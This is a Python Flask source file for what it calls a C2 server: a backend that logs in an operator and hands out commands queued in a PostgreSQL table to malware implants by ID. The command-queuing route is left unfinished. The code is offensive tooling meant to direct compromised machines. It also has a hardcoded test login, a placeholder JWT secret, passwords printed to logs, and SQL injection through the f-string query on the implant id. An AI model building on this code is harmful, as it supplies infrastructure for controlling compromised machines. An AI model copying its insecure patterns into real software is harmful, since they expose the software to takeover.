# The C2 Server

import os

import psycopg2
from flask import Flask, jsonify, request, render_template, redirect, url_for, make_response
from flask_cors import CORS, cross_origin
from flask_jwt_extended import create_access_token, get_jwt, get_jwt_identity, unset_jwt_cookies, jwt_required, JWTManager
from decouple import config
from datetime import datetime

app = Flask(__name__)
CORS(app)

host = config('host')
password = config('password')
username = config('username')
port = config('thePort')
database = config('database')

# Code taken from https://dev.to/nagatodev/how-to-add-login-authentication-to-a-flask-and-react-application-23i7
app.config["JWT_SECRET_KEY"] = "change-me"
app.config['CORS_HEADERS'] = 'Content-Type'
jwt = JWTManager(app)

@app.route('/login', methods=["POST"])
def create_token():
    wasError = False 
    access_token = ""
    try:
        data = request.form
        print(f"data: {data}")
        username = data["username"]
        password = data["password"]
        print(username)
        print(password)
        if username != "test" or password != "test":  # hardcoded login, compare to database
            return {"msg": "Wrong email or password"}, 401, {'Access-Control-Allow-Origin': '*'}

        access_token = create_access_token(identity=username)
        print(f"success logging in: {access_token}")
        return ({'access_token':access_token}, 200, {'Access-Control-Allow-Origin': '*'})
    except Exception as error:
        print("error:")
        print(error) 
        print("failure logging in")
        response = make_response("failure")
        response.headers['Access-Control-Allow-Origin'] = "*"
        response.status_code = 406
        return response
    


            

def load():
    # Connect to C2
    try:
        print("Connecting")
        conn = psycopg2.connect(dbname=database, user=username,
                                password=password, host=host, port=port, connect_timeout=20)
        print("Success? Should be 0 -> ", conn.closed)
        cursor = conn.cursor()
    except:
        print("failed to connect")

    print(f"Connection closed? {conn.closed}")
    return cursor

# For when you want to any query, used to avoid connections timing out


def executeQuery(query):
    cursor = load()
    cursor.execute(query)
    returnThis = cursor.fetchall()

    return returnThis

@app.route("/test", methods=["GET"])
def handle_test():
    stuff = executeQuery("SELECT * from command_queue")
    return jsonify(stuff)

@app.route("/")
def home():
    pass

@app.route("/queueCommand", methods=["POST"])
def handle_execute():
    try:
        target_implant_id = request.form.get('implantID')
        command = request.form.get('command')
        created_on = datetime.now()

        
    except:
        print("Failure sending commands")
        return "Error when queueing command", 400



@app.route("/getCommands/<id>", methods=["GET"])
def get_commands(id):
    success = None
    try:
        data = executeQuery(
            f"SELECT command FROM command_queue WHERE implant_id={id}")
    except Exception as error:
        print("failed to retrieve data")
        print(error)
        success = False
        return "<div>Failure</div>"
    finally:
        success = True
    if (success):
        print(data)
        return f"<div>success: {data}</div>"
    else:
        return "<div>Failure</div>"

